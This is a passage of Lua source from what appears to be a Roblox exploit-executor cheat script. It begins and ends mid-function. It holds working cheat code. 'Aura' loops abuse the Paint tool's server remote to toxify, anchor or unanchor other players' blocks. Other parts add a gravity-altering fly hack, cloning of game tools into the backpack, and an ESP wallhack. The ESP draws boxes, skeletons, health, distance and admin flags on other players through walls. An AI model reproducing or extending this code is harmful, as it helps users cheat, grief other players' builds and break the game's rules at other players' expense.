                 pt = myChar and (myChar:FindFirstChild("Paint") or plr.Backpack:FindFirstChild("Paint"))
                if pt then
                    if pt.Parent ~= myChar then pt.Parent = myChar end
                     ps = pt:FindFirstChild("Script")
                    if ps and ps:FindFirstChild("Event") then
                        local toxified = 0
                        for _, blk in ipairs(toxBlocks) do
                            if blk:IsDescendantOf(cfolder) then
                                ps.Event:FireServer(blk, Enum.NormalId.Top, targetHrp.Position, "material", Color3.new(0,0,0), "toxic", "")
                                toxified = toxified + 1
                                if toxified >= _auraBatchSize then break end
                            end
                        end
                    end
                end

            elseif auraType == "signAura" then
                 pos = targetHrp.Position + Vector3.new(math.random(-5,5), 0, math.random(-5,5))
                if isog then ExecuteSignOG(pos) else ExecuteSign(pos) end

            elseif auraType == "anchorAura" then
                 ab = workspace:FindPartsInRegion3(
                    Region3.new(
                        targetHrp.Position - Vector3.new(auraSettings[auraType].range,5,auraSettings[auraType].range),
                        targetHrp.Position + Vector3.new(auraSettings[auraType].range,5,auraSettings[auraType].range)
                    ), nil, 500)
                 pt = myChar and (myChar:FindFirstChild("Paint") or plr.Backpack:FindFirstChild("Paint"))
                if pt then
                    if pt.Parent ~= myChar then pt.Parent = myChar end
                     ps = pt:FindFirstChild("Script")
                    if ps and ps:FindFirstChild("Event") then
                        local anchored = 0
                        for _, blk in ipairs(ab) do
                            if blk:IsDescendantOf(cfolder) and not blk.Anchored then
                                ps.Event:FireServer(blk, Enum.NormalId.Top, targetHrp.Position, "material", nil, "anchor", "")
                                anchored = anchored + 1
                                if anchored >= _auraBatchSize then break end
                            end
                        end
                    end
                end

            elseif auraType == "unanchorAura" then
                 ub = workspace:FindPartsInRegion3(
                    Region3.new(
                        targetHrp.Position - Vector3.new(auraSettings[auraType].range,5,auraSettings[auraType].range),
                        targetHrp.Position + Vector3.new(auraSettings[auraType].range,5,auraSettings[auraType].range)
                    ), nil, 500)
                 pt = myChar and (myChar:FindFirstChild("Paint") or plr.Backpack:FindFirstChild("Paint"))
                if pt then
                    if pt.Parent ~= myChar then pt.Parent = myChar end
                     ps = pt:FindFirstChild("Script")
                    if ps and ps:FindFirstChild("Event") then
                        local unanchored = 0
                        for _, blk in ipairs(ub) do
                            if blk:IsDescendantOf(cfolder) and blk.Anchored then
                                ps.Event:FireServer(blk, Enum.NormalId.Top, targetHrp.Position, "material", nil, "anchor", "")
                                unanchored = unanchored + 1
                                if unanchored >= _auraBatchSize then break end
                            end
                        end
                    end
                end
            end
        end
    end)
end

function StartFlying()
    for _, c in pairs(flyConnections) do c:Disconnect() end
    flyConnections = {}
    flyVar6 = false

    if not plr.Character then return end
    local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not hrp then return end

    plr:SetAttribute("Flying", true)

    pcall(function()
        _flyControlModule = require(plr:WaitForChild("PlayerScripts", 5).PlayerModule:WaitForChild("ControlModule", 5))
    end)

    table.insert(flyConnections, humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
        if plr:GetAttribute("Flying") == true then
            humanoid.Jump = false
        end
    end))

    table.insert(flyConnections, plr:GetAttributeChangedSignal("Flying"):Connect(function()
        if plr:GetAttribute("Flying") == false then
            flyVar6 = false
            humanoid.PlatformStand = false
            pcall(function() hrp.Running.Volume = 0.65 end)
            workspace.Gravity = 196.2
        end
    end))

    flyLastJumpTime = time()
    table.insert(flyConnections, UserInputService.JumpRequest:Connect(function()
        if plr:GetAttribute("Flying") == true and 0.5 < time() - flyLastJumpTime then
            if flyVar6 == false then
                flyVar6 = true
                humanoid.PlatformStand = true
                pcall(function() hrp.Running.Volume = 0 end)
                hrp.AssemblyLinearVelocity = hrp.AssemblyLinearVelocity + Vector3.new(0, humanoid.JumpHeight * 2.5, 0)
            else
                flyVar6 = false
                humanoid.PlatformStand = false
                pcall(function() hrp.Running.Volume = 0.65 end)
                workspace.Gravity = 196.2
            end
            flyLastJumpTime = time()
        end
    end))

    table.insert(flyConnections, RunService.RenderStepped:Connect(function()
        if plr:GetAttribute("Flying") ~= true or flyVar6 ~= true then return end
        workspace.Gravity = 1
        hrp.AssemblyLinearVelocity = hrp.AssemblyLinearVelocity / 1.1
        hrp.AssemblyAngularVelocity = hrp.AssemblyAngularVelocity / 1.1

        local camera = workspace.CurrentCamera
        local moveVec = Vector3.zero
        if _flyControlModule then
            pcall(function() moveVec = _flyControlModule:GetMoveVector() end)
        end

        local dir = Vector3.zero
        if moveVec.X >  0.5 then dir = dir + camera.CFrame.RightVector end
        if moveVec.X < -0.5 then dir = dir - camera.CFrame.RightVector end
        if moveVec.Z >  0.5 then dir = dir - camera.CFrame.LookVector  end
        if moveVec.Z < -0.5 then dir = dir + camera.CFrame.LookVector  end
        if UserInputService:IsKeyDown(Enum.KeyCode.E) then dir = dir + camera.CFrame.UpVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.Q) then dir = dir - camera.CFrame.UpVector end

        hrp.AssemblyLinearVelocity = hrp.AssemblyLinearVelocity + dir * (flySpeed / 10 * 2.5)
        plr.Character:PivotTo(CFrame.new(
            plr.Character:GetPivot().Position,
            plr.Character:GetPivot().Position + camera.CFrame.LookVector
        ))
    end))
end

function StopFlying()
    plr:SetAttribute("Flying", false)
    flyVar6 = false
    for _, c in pairs(flyConnections) do c:Disconnect() end
    flyConnections = {}
    if plr.Character then
        local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
        local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
        if humanoid then humanoid.PlatformStand = false end
        pcall(function() if hrp then hrp.Running.Volume = 0.65 end end)
    end
    workspace.Gravity = 196.2
end

function GrabTools()
     tools = {"Paint", "Delete", "Build", "Sign"}
     toolsFound = 0
    
    for _, toolName in ipairs(tools) do
         tool = workspace:FindFirstChild(toolName)
        if tool then
            tool:Clone().Parent = plr.Backpack
            toolsFound = toolsFound + 1
        end
    end
    
    Library:Notify("Grabbed " .. toolsFound .. " tools", 3)
end

 toolsESPObjects = {}
 _toolsESPAddConn = nil
 _toolsESPRemoveConn = nil

 espColorMap = {
    Red    = Color3.new(1,0,0),
    Blue   = Color3.new(0,0,1),
    Green  = Color3.new(0,1,0),
    Yellow = Color3.new(1,1,0),
    Purple = Color3.new(0.5,0,0.5),
    White  = Color3.new(1,1,1),
    Cyan   = Color3.new(0,1,1),
    Orange = Color3.new(1,0.5,0),
    Pink   = Color3.new(1,0.4,0.8),
    Rainbow = Color3.new(1,0,0)
}

 function getCurrentESPColor()
    if ESPColorPicker then
         v = ESPColorPicker.Value
        if v == "Rainbow" then
            return Color3.fromHSV(tick() % 5 / 5, 1, 1)
        end
        return espColorMap[v] or Color3.new(1,0,0)
    end
    return Color3.new(1,0,0)
end

 function getESPTransparency()
    if ESPTransparencySlider then return ESPTransparencySlider.Value end
    return 0.6
end

 function getPlayerBuildCount(player)
     folder = cfolder:FindFirstChild(player.Name)
    if folder then return #folder:GetChildren() end
    return 0
end

 function getPlayerBuildCenter(player)
    local folder = cfolder:FindFirstChild(player.Name)
    if not folder then return nil, 0 end
    local parts = folder:GetChildren()
    local partCount = #parts
    if partCount == 0 then return nil, 0 end
    local sum = Vector3.new(0,0,0)
    local count = 0
    for _, p in ipairs(parts) do
        if p:IsA("BasePart") then
            sum = sum + p.Position
            count = count + 1
        end
    end
    local center = count > 0 and (sum / count) or nil
    return center, count > 0 and count or partCount
end

 function getDistance(player)
     myChar = plr.Character
     theirChar = player.Character
    if not myChar or not theirChar then return 0 end
     myHrp = myChar:FindFirstChild("HumanoidRootPart")
     theirHrp = theirChar:FindFirstChild("HumanoidRootPart")
    if not myHrp or not theirHrp then return 0 end
    return math.floor((myHrp.Position - theirHrp.Position).Magnitude)
end

 function shouldESPPlayer(player)
    if player == plr then return false end
    if espTrackedPlayer == "all" then return true end
    if espTrackedPlayer == "others" then return player ~= plr end

    return player.Name:lower():find(espTrackedPlayer:lower()) ~= nil
end

-- Helper: create a Drawing line (returns nil on executors without Drawing support)
local _drawingSupported = nil
local function _tryNewDrawing(type)
    if _drawingSupported == false then return nil end
    local ok, obj = pcall(function() return Drawing.new(type) end)
    if not ok or not obj then _drawingSupported = false; return nil end
    _drawingSupported = true
    return obj
end

-- Create all Drawing objects for one player and store in espDrawObjects[player]
local function CreateDrawESP(player)
    local char = player.Character
    if not char then return end
    local existing = espDrawObjects[player]
    if existing then return end  -- already created, update loop handles it

    local col = getCurrentESPColor()
    local drawEntry = {}

    -- 2D box: 4 lines (top, bottom, left, right)
    if esp2DBoxEnabled then
        local lines = {}
        for i = 1, 4 do
            local ln = _tryNewDrawing("Line")
            if ln then
                ln.Color     = col
                ln.Thickness = 1.5
                ln.Transparency = 0
                ln.Visible   = false
                table.insert(lines, ln)
            end
        end
        if #lines == 4 then drawEntry.box2d = lines end
    end

    -- 3D box: 12 corner lines
    if esp3DBoxEnabled then
        local lines = {}
        for i = 1, 12 do
            local ln = _tryNewDrawing("Line")
            if ln then
                ln.Color     = col
                ln.Thickness = 1
                ln.Transparency = 0
                ln.Visible   = false
                table.insert(lines, ln)
            end
        end
        if #lines == 12 then drawEntry.box3d = lines end
    end

    -- Skeleton: 8 bone lines
    if espSkeletonEnabled then
        local lines = {}
        for i = 1, 8 do
            local ln = _tryNewDrawing("Line")
            if ln then
                ln.Color     = col
                ln.Thickness = 1
                ln.Transparency = 0.2
                ln.Visible   = false
                table.insert(lines, ln)
            end
        end
        if #lines == 8 then drawEntry.skeleton = lines end
    end

    -- Hitbox: 4 lines (square around HRP)
    if espHitboxEnabled then
        local lines = {}
        for i = 1, 4 do
            local ln = _tryNewDrawing("Line")
            if ln then
                ln.Color     = Color3.fromRGB(255, 80, 80)
                ln.Thickness = 1
                ln.Transparency = 0
                ln.Visible   = false
                table.insert(lines, ln)
            end
        end
        if #lines == 4 then drawEntry.hitbox = lines end
    end

    espDrawObjects[player] = drawEntry
end

-- Remove all Drawing objects for a player
local function RemoveDrawESP(player)
    local entry = espDrawObjects[player]
    if not entry then return end
    for _, group in pairs(entry) do
        for _, ln in ipairs(group) do
            pcall(function() ln:Remove() end)
        end
    end
    espDrawObjects[player] = nil
end

function CreateESP(player)
    RemoveESP(player)
    local character = player.Character
    if not character then return end

    -- Roblox Highlight (only when enabled)
    if espHighlightEnabled then
        local color  = getCurrentESPColor()
        local transp = getESPTransparency()
        local hl = Instance.new("Highlight")
        hl.Name                = "RomazESP"
        hl.Adornee             = character
        hl.FillTransparency    = transp
        hl.OutlineTransparency = 0
        hl.OutlineColor        = color
        hl.FillColor           = color
        hl.DepthMode           = espXrayEnabled
            and Enum.HighlightDepthMode.AlwaysOnTop
            or  Enum.HighlightDepthMode.Occluded
        hl.Parent = playerGui
        espObjects[player] = hl
    end

    -- Drawing-based visuals
    CreateDrawESP(player)

    if espNametags then
        CreateESPNametag(player)
    end
end

local function _containerHasArkenstone(container)
    if not container then return false end
    local ok, found = pcall(function()
        return container:FindFirstChild("The Arkenstone", true)
    end)
    return ok and found ~= nil
end

function getPlayerEnlighten(player)
    if not player then return false end
    return _containerHasArkenstone(player.Character)
        or _containerHasArkenstone(player:FindFirstChild("Backpack"))
end

function getPlayerAdmin(player)
    if not player then return false end
     success, result = pcall(function()
        return player.Team and player.Team.Name == "Chosen"
    end)
    return success and result
end

function getPlayerTime(player)
    if not player then return nil end
     success, result = pcall(function()
         ls = player:FindFirstChild("leaderstats")
        if ls then
             timeVal = ls:FindFirstChild("Time")
            if timeVal then return tostring(timeVal.Value) end
        end
        return nil
    end)
    return success and result or nil
end

 confirmedHubUsers    = {}
 confirmedHubUserIds  = {}
 hubRespawnConns      = {}
 _relayHeartbeatRunning = false

function CreateESPNametag(player)
    RemoveESPNametag(player)
    local character = player.Character
    if not character then return end
    local head = character:FindFirstChild("Head")
    if not head then return end

    local espColor = getCurrentESPColor()
    local hasEnlighten = getPlayerEnlighten(player)
    local isAdmin = getPlayerAdmin(player)
    local hasBadges = hasEnlighten or isAdmin or confirmedHubUsers[player]

    local bbH    = hasBadges and 96 or 80
    local infoY  = hasBadges and 60 or 44
    local statsY = hasBadges and 73 or 57
    local sepY   = hasBadges and 55 or 39

    local bb = Instance.new("BillboardGui")
    bb.Name = "RomazESPTag"
    bb.Size = UDim2.new(0, 210, 0, bbH)
    bb.StudsOffset = Vector3.new(0, 3.4, 0)
    bb.AlwaysOnTop = false
    bb.ResetOnSpawn = false
    bb.MaxDistance = 1000
    bb.ClipsDescendants = true
    bb.Parent = head

    local card = Instance.new("Frame")
    card.Name = "Card"
    card.BackgroundColor3 = Color3.fromRGB(14, 20, 32)
    card.BackgroundTransparency = 0.05
    card.BorderSizePixel = 0
    card.Size = UDim2.new(1, 0, 1, 0)
    card.Parent = bb
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 6)

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 60, 140)
    stroke.Thickness = 1.2
    stroke.Transparency = 0.1
    stroke.Parent = card

    local accentBar = Instance.new("Frame")
    accentBar.Name = "Accent"
    accentBar.BackgroundColor3 = espColor
    accentBar.BorderSizePixel = 0
    accentBar.Size = UDim2.new(1, 0, 0, 2)
    accentBar.Parent = card
    Instance.new("UICorner", accentBar).CornerRadius = UDim.new(0, 6)

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Name = "NameLabel"
    nameLabel.BackgroundTransparency = 1
    nameLabel.Position = UDim2.new(0, 8, 0, 6)
    nameLabel.Size = UDim2.new(1, -16, 0, 18)
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.TextScaled = true
    nameLabel.TextStrokeTransparency = 0.3
    nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    nameLabel.TextColor3 = Color3.fromRGB(235, 240, 255)
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
    nameLabel.Text = player.DisplayName
    nameLabel.Parent = card

    local userLabel = Instance.new("TextLabel")
    userLabel.Name = "UserLabel"
    userLabel.BackgroundTransparency = 1
    userLabel.Position = UDim2.new(0, 8, 0, 25)
    userLabel.Size = UDim2.new(1, -16, 0, 12)
    userLabel.Font = Enum.Font.Gotham
    userLabel.TextScaled = true
    userLabel.TextStrokeTransparency = 0.5
    userLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    userLabel.TextColor3 = Color3.fromRGB(95, 130, 180)
    userLabel.TextXAlignment = Enum.TextXAlignment.Left
    userLabel.Text = "@" .. player.Name
    userLabel.Parent = card

    if hasBadges then
        local badgeRow = Instance.new("Frame")
        badgeRow.Name = "Badges"
        badgeRow.BackgroundTransparency = 1
        badgeRow.Position = UDim2.new(0, 6, 0, 39)
        badgeRow.Size = UDim2.new(1, -12, 0, 14)
        badgeRow.Parent = card

        local badgeLayout = Instance.new("UIListLayout")
        badgeLayout.FillDirection = Enum.FillDirection.Horizontal
        badgeLayout.Padding = UDim.new(0, 4)
        badgeLayout.SortOrder = Enum.SortOrder.LayoutOrder
        badgeLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        badgeLayout.Parent = badgeRow

        local function makeBadge(text, color, order, width)
            local f = Instance.new("Frame")
            f.Size = UDim2.new(0, width, 1, 0)
            f.BackgroundColor3 = color
            f.BackgroundTransparency = 0.15
            f.BorderSizePixel = 0
            f.LayoutOrder = order
            f.Parent = badgeRow
            Instance.new("UICorner", f).CornerRadius = UDim.new(1, 0)
            local lbl = Instance.new("TextLabel")
            lbl.BackgroundTransparency = 1
            lbl.Size = UDim2.new(1, 0, 1, 0)
            lbl.Font = Enum.Font.GothamBold
            lbl.TextScaled = true
            lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
            lbl.TextStrokeTransparency = 0.4
            lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            lbl.Text = text
            lbl.Parent = f
        end

        if hasEnlighten             then makeBadge("ENLIGHTEN", Color3.fromRGB(255, 185, 0),  1, 68) end
        if isAdmin                  then makeBadge("ADMIN",     Color3.fromRGB(210, 45,  45), 2, 46) end
        if confirmedHubUsers[player] then makeBadge("HUB",      Color3.fromRGB(0,   85,  255), 3, 36) end
    end

    local sep = Instance.new("Frame")
    sep.BackgroundColor3 = Color3.fromRGB(0, 50, 110)
    sep.BackgroundTransparency = 0.4
    sep.BorderSizePixel = 0
    sep.Position = UDim2.new(0.04, 0, 0, sepY)
    sep.Size = UDim2.new(0.92, 0, 0, 1)
    sep.Parent = card

    local infoLabel = Instance.new("TextLabel")
    infoLabel.Name = "InfoLabel"
    infoLabel.BackgroundTransparency = 1
    infoLabel.Position = UDim2.new(0, 8, 0, infoY)
    infoLabel.Size = UDim2.new(1, -16, 0, 12)
    infoLabel.Font = Enum.Font.Gotham
    infoLabel.TextScaled = true
    infoLabel.TextStrokeTransparency = 0.5
    infoLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    infoLabel.TextColor3 = Color3.fromRGB(95, 130, 180)
    infoLabel.TextXAlignment = Enum.TextXAlignment.Left
    infoLabel.Text = "..."
    infoLabel.Parent = card

    local statsLabel = Instance.new("TextLabel")
    statsLabel.Name = "StatsLabel"
    statsLabel.BackgroundTransparency = 1
    statsLabel.Position = UDim2.new(0, 8, 0, statsY)
    statsLabel.Size = UDim2.new(1, -16, 0, 11)
    statsLabel.Font = Enum.Font.Gotham
    statsLabel.TextScaled = true
    statsLabel.TextStrokeTransparency = 0.5
    statsLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    statsLabel.TextColor3 = espColor
    statsLabel.TextXAlignment = Enum.TextXAlignment.Left
    statsLabel.Text = ""
    statsLabel.Parent = card

    -- Health bar: track at bottom of card (replaces bottomLine)
    local hpTrack = Instance.new("Frame")
    hpTrack.Name = "HPTrack"
    hpTrack.BackgroundColor3 = Color3.fromRGB(25, 35, 55)
    hpTrack.BackgroundTransparency = 0.2
    hpTrack.BorderSizePixel = 0
    hpTrack.AnchorPoint = Vector2.new(0, 1)
    hpTrack.Position = UDim2.new(0.04, 0, 1, -3)
    hpTrack.Size = UDim2.new(0.92, 0, 0, 4)
    hpTrack.Parent = card
    Instance.new("UICorner", hpTrack).CornerRadius = UDim.new(1, 0)

    local hpFill = Instance.new("Frame")
    hpFill.Name = "HPFill"
    hpFill.BackgroundColor3 = Color3.fromRGB(80, 200, 80)
    hpFill.BorderSizePixel = 0
    hpFill.Size = UDim2.new(1, 0, 1, 0)
    hpFill.Parent = hpTrack
    Instance.new("UICorner", hpFill).CornerRadius = UDim.new(1, 0)

    espNameLabels[player] = {
        bb = bb,
        nameLabel = nameLabel,
        infoLabel = infoLabel,
        statsLabel = statsLabel,
        accent = accentBar,
        hpFill = hpFill,
    }
end

function RemoveESP(player)
    if espObjects[player] then
        pcall(function() espObjects[player]:Destroy() end)
        espObjects[player] = nil
    end
    RemoveDrawESP(player)
    RemoveESPNametag(player)
end

function RemoveESPNametag(player)
    if espNameLabels[player] then
        if espNameLabels[player].bb then
            espNameLabels[player].bb:Destroy()
        end
        espNameLabels[player] = nil
    end
end

function CreateBuildESP(player)
    RemoveBuildESP(player)
     folder = cfolder:FindFirstChild(player.Name)
    if not folder then return end
    if #folder:GetChildren() == 0 then return end

     color = getCurrentESPColor()

     hl = Instance.new("Highlight")
    hl.Name            = "RomazBuildESP"
    hl.FillColor       = color
    hl.OutlineColor    = color
    hl.FillTransparency    = 0.65
    hl.OutlineTransparency = 0
    hl.DepthMode       = espXrayEnabled
        and Enum.HighlightDepthMode.AlwaysOnTop
        or  Enum.HighlightDepthMode.Occluded
    hl.Adornee         = folder
    hl.Parent          = playerGui
    espBuildObjects[player] = hl

    local center = getPlayerBuildCenter(player)
    if center then
        local marker = Instance.new("Part")
        marker.Anchored     = true
        marker.Transparency = 1
        marker.CanCollide   = false
        marker.CanQuery     = false
        marker.CFrame       = CFrame.new(center)
        marker.Size         = Vector3.new(0.1, 0.1, 0.1)
        marker.Name         = "RomazBuildMarker_" .. player.Name
        marker.Parent       = workspace

        local bb = Instance.new("BillboardGui")
        bb.Name         = "RomazBuildLabel"
        bb.Size         = UDim2.new(0, 230, 0, 58)
        bb.AlwaysOnTop  = espXrayEnabled
        bb.ResetOnSpawn = false
        bb.StudsOffset  = Vector3.new(0, 2, 0)
        bb.Adornee      = marker
        bb.Parent       = playerGui

        local bg = Instance.new("Frame")
        bg.BackgroundColor3    = Color3.fromRGB(20, 20, 20)
        bg.BackgroundTransparency = 0.08
        bg.BorderSizePixel     = 0
        bg.Size                = UDim2.new(1, 0, 1, 0)
        bg.Parent              = bb
        Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 6)

        local bStroke = Instance.new("UIStroke")
        bStroke.Color = Color3.fromRGB(50, 50, 50)
        bStroke.Thickness = 1.2
        bStroke.Transparency = 0.2
        bStroke.Parent = bg

        local bAccent = Instance.new("Frame")
        bAccent.BackgroundColor3 = color
        bAccent.BorderSizePixel = 0
        bAccent.Size = UDim2.new(1, 0, 0, 2)
        bAccent.Parent = bg
        Instance.new("UICorner", bAccent).CornerRadius = UDim.new(0, 6)

        local lbl = Instance.new("TextLabel")
        lbl.BackgroundTransparency = 1
        lbl.Position               = UDim2.new(0, 6, 0, 6)
        lbl.Size                   = UDim2.new(1, -12, 1, -12)
        lbl.Font                   = Enum.Font.GothamBold
        lbl.TextScaled             = true
        lbl.TextColor3             = color
        lbl.TextStrokeTransparency = 0.2
        lbl.TextStrokeColor3       = Color3.fromRGB(0, 0, 0)
        lbl.TextXAlignment         = Enum.TextXAlignment.Left
        lbl.Text = player.Name .. "  |  " .. getPlayerBuildCount(player) .. " cubes"
        lbl.Parent = bg

        espBuildLabels[player] = { bb = bb, lbl = lbl, marker = marker }
    end
end

function RemoveBuildESP(player)
    if espBuildObjects[player] then
        pcall(function() espBuildObjects[player]:Destroy() end)
        espBuildObjects[player] = nil
    end
    if espBuildLabels[player] then
        local data = espBuildLabels[player]
        if data.bb     then pcall(function() data.bb:Destroy()     end) end
        if data.marker then pcall(function() data.marker:Destroy() end) end
        espBuildLabels[player] = nil
    end
end

function RemoveAllBuildESP()
    for player, _ in pairs(espBuildObjects) do
        RemoveBuildESP(player)
    end
end

function RemoveAllESP()
    for player, _ in pairs(espObjects) do
        RemoveESP(player)
    end
    RemoveAllBuildESP()
end

function getplrpos(p)
     c = (p or localplr).Character
    if c and c:FindFirstChild("HumanoidRootPart") then
        return c.HumanoidRootPart.Position
    end
    return Vector3.new(0, 100, 0)
end

-- Reusable tables to avoid GC pressure in ESP hot path
local _espToRemove = {}
local _espBuildToRemove = {}

function StartESPUpdateLoop()
    if espUpdateConnection then espUpdateConnection:Disconnect() end
     t = 0
    espUpdateConnection = RunService.Heartbeat:Connect(function(dt)
        t = t + dt
        if t < 0.25 then return end
        t = 0

        -- Skip entirely if no ESP objects exist and toggle is off
        if not PlayersESPToggle.Value and not next(espObjects) and not next(espBuildLabels) then return end

         ok, err = pcall(function()
         color = getCurrentESPColor()
        local depthMode = espXrayEnabled
            and Enum.HighlightDepthMode.AlwaysOnTop
            or  Enum.HighlightDepthMode.Occluded
        local transp = getESPTransparency()

        -- Reuse table instead of allocating new one each cycle
        local removeCount = 0
        for player, hl in pairs(espObjects) do
            if not player or not player.Parent then
                removeCount = removeCount + 1
                _espToRemove[removeCount] = player
            elseif hl and hl.Parent then
                hl.OutlineColor      = color
                hl.FillColor         = color
                hl.DepthMode         = depthMode
                hl.FillTransparency  = transp

                local char = player.Character
                if char and hl.Adornee ~= char then
                    hl.Adornee = char
                    if espNametags then pcall(CreateESPNametag, player) end
                end

                if espNameLabels[player] then
                    local tags = espNameLabels[player]
                    if tags.accent and tags.accent.Parent then tags.accent.BackgroundColor3 = color end
                    local dist       = getDistance(player)
                    local buildCount = getPlayerBuildCount(player)
                    local hum        = char and char:FindFirstChildOfClass("Humanoid")

                    local info = ""
                    if espShowDistance  then info = info .. dist .. "m" end
                    if espShowDistance and espShowBuildCount then info = info .. "  |  " end
                    if espShowBuildCount then info = info .. buildCount .. " cubes" end
                    if tags.infoLabel and tags.infoLabel.Parent then
                        tags.infoLabel.Text = info
                    end

                    local statsInfo = ""
                    local timeVal = getPlayerTime(player)
                    if timeVal then statsInfo = "Time: " .. timeVal end
                    local hasEnlighten = getPlayerEnlighten(player)
                    if hasEnlighten then
                        statsInfo = statsInfo .. (statsInfo ~= "" and "  |  " or "") .. "Enlightened"
                    end
                    if tags.statsLabel and tags.statsLabel.Parent then
                        tags.statsLabel.Text = statsInfo
                        tags.statsLabel.TextColor3 = color
                    end

                    if tags.hpFill and tags.hpFill.Parent and hum then
                        local hp    = hum.Health
                        local maxHp = hum.MaxHealth
                        local ratio = (maxHp > 0 and maxHp < 1e15) and math.clamp(hp / maxHp, 0, 1) or 1
                        tags.hpFill.Size = UDim2.new(ratio, 0, 1, 0)
                        local r = math.clamp(2 * (1 - ratio), 0, 1)
                        local g = math.clamp(2 * ratio, 0, 1)
                        tags.hpFill.BackgroundColor3 = Color3.new(r * 0.85, g * 0.75 + 0.15, 0.1)
                    end

                    local head = char and char:FindFirstChild("Head")
                    if head and tags.bb and tags.bb.Parent ~= head then
                        tags.bb.Parent = head
                    end
                end
            end
        end
        for i = 1, removeCount do RemoveESP(_espToRemove[i]); _espToRemove[i] = nil end

        if PlayersESPToggle.Value then
            local playerList = Players:GetPlayers()
            for i = 1, #playerList do
                local p = playerList[i]
                if shouldESPPlayer(p) and not espObjects[p] and p.Character then
                    CreateESP(p)
                end
            end
        end

        local buildRemoveCount = 0
        for player, hl in pairs(espBuildLabels) do
            if not player or not player.Parent then
                buildRemoveCount = buildRemoveCount + 1
                _espBuildToRemove[buildRemoveCount] = player
            else
                local center, count = getPlayerBuildCenter(player)

                if center and hl.marker and hl.marker.Parent then
                    hl.marker.CFrame = CFrame.new(center)
                end
                if hl.lbl and hl.lbl.Parent then
                    hl.lbl.Text      = player.Name .. "  |  " .. count .. " cubes"
                    hl.lbl.TextColor3 = color
                end
                if espBuildObjects[player] then
                    espBuildObjects[player].FillColor    = color
                    espBuildObjects[player].OutlineColor = color
                    espBuildObjects[player].DepthMode    = depthMode
                end
            end
        end
        for i = 1, buildRemoveCount do RemoveBuildESP(_espBuildToRemove[i]); _espBuildToRemove[i] = nil end
        end)
    end)
end

function StopESPUpdateLoop()
    if espUpdateConnection then
        espUpdateConnection:Disconnect()
        espUpdateConnection = nil
    end
    if espDrawConnection then
        espDrawConnection:Disconnect()
        espDrawConnection = nil
    end
end

-- ── Fast Drawing ESP update loop (runs every frame via Heartbeat) ─────────────
-- Projects player character bounds to screen and updates line positions.
-- Kept separate from the 0.25s Highlight loop so boxes are always smooth.
local function _worldToScreen(pos)
    local cam = workspace.CurrentCamera
    if not cam then return nil, nil, false end
    local vp, inView = cam:WorldToViewportPoint(pos)
    return Vector2.new(vp.X, vp.Y), vp.Z, inView and vp.Z > 0
end

local function _getCharBounds(char)
    -- Returns min/max of all BaseParts in the character for a tight 2D box
    local cam  = workspace.CurrentCamera
    if not cam then return nil end
    local minX, minY, maxX, maxY = math.huge, math.huge, -math.huge, -math.huge
    local anyOnScreen = false
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
            local s, d, vis = _worldToScreen(part.Position)
            if vis then
                anyOnScreen = true
                if s.X < minX then minX = s.X end
                if s.Y < minY then minY = s.Y end
                if s.X > maxX then maxX = s.X end
                if s.Y > maxY then maxY = s.Y end
            end
        end
    end
    if not anyOnScreen then return nil end
    -- Add padding
    local pad = 4
    return minX - pad, minY - pad, maxX + pad, maxY + pad
end

local _BONES = {
    {"Head",              "UpperTorso"},
    {"UpperTorso",        "LowerTorso"},
    {"LowerTorso",        "LeftUpperLeg"},
    {"LowerTorso",        "RightUpperLeg"},
    {"LeftUpperLeg",      "LeftLowerLeg"},
    {"RightUpperLeg",     "RightLowerLeg"},
    {"UpperTorso",        "LeftUpperArm"},
    {"UpperTorso",        "RightUpperArm"},
}
local _BONES_R6 = {
    {"Head",   "Torso"},
    {"Torso",  "Left Arm"},
    {"Torso",  "Right Arm"},
    {"Torso",  "Left Leg"},
    {"Torso",  "Right Leg"},
    {"Head",   "Torso"},
    {"Torso",  "Left Arm"},
    {"Torso",  "Right Arm"},
}

local function _setLine(ln, p1, p2, col)
    ln.From    = p1
    ln.To      = p2
    ln.Color   = col
    ln.Visible = true
end

local function _hideLines(tbl)
    for _, ln in ipairs(tbl) do ln.Visible = false end
end

function StartDrawESPLoop()
    if espDrawConnection then espDrawConnection:Disconnect() end
    espDrawConnection = RunService.Heartbeat:Connect(function()
        if not PlayersESPToggle.Value then
            -- Hide all drawing objects when ESP is off
            for _, entry in pairs(espDrawObjects) do
                for _, group in pairs(entry) do _hideLines(group) end
            end
            return
        end

        local col = getCurrentESPColor()

        for player, entry in pairs(espDrawObjects) do
            local char = player and player.Character
            if not char or not player.Parent then
                -- Player gone — clean up next slow-loop cycle
                for _, group in pairs(entry) do _hideLines(group) end
            else
                -- 2D box
                if entry.box2d and esp2DBoxEnabled then
                    local x1, y1, x2, y2 = _getCharBounds(char)
                    if x1 then
                        -- top, bottom, left, right
                        _setLine(entry.box2d[1], Vector2.new(x1,y1), Vector2.new(x2,y1), col)
                        _setLine(entry.box2d[2], Vector2.new(x1,y2), Vector2.new(x2,y2), col)
                        _setLine(entry.box2d[3], Vector2.new(x1,y1), Vector2.new(x1,y2), col)
                        _setLine(entry.box2d[4], Vector2.new(x2,y1), Vector2.new(x2,y2), col)
                    else
                        _hideLines(entry.box2d)
                    end
                elseif entry.box2d then
                    _hideLines(entry.box2d)
                end

                -- 3D box (8 corners of HRP bounding box, 12 edges)
                if entry.box3d and esp3DBoxEnabled then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local sz = hrp.Size * 0.5
